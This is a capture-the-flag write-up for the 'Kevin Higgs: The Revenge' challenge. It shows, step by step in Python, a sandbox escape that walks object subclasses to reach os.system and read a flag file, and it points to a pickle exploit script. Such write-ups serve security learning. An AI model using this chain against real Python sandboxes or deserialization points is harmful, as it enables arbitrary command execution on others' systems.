# Kevin Higgs: The Revenge

## Write-up

1. Our target payload to read the flag is the following:

    ```python
    empty.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(104)().load_module('os').system('cat flag.txt')
    ```

2. To achieve that, we have to take advantage of the following behavior to move to deeper attributes:

    ```python
    empty.__init__("foo", obj) # "foo" is just a dummy module name (empty.__name__)
    assert(empty.__doc__ == obj) # True
    ```

3. So the idea is to construct the target payload step by step using that trick:

    ```python
    empty.__init__("x1", empty.__class__.__bases__)
    empty.__init__("x2", empty.__doc__.__getitem__(0))
    empty.__init__("x3", empty.__doc__.__subclasses__())
    empty.__init__("x4", empty.__doc__.__getitem__(104)())
    empty.__init__("x5", empty.__doc__.load_module('os'))
    empty.__doc__.system("cat flag.txt")
    ```

4. Full pickle payload in [exploit script](./solve.py).
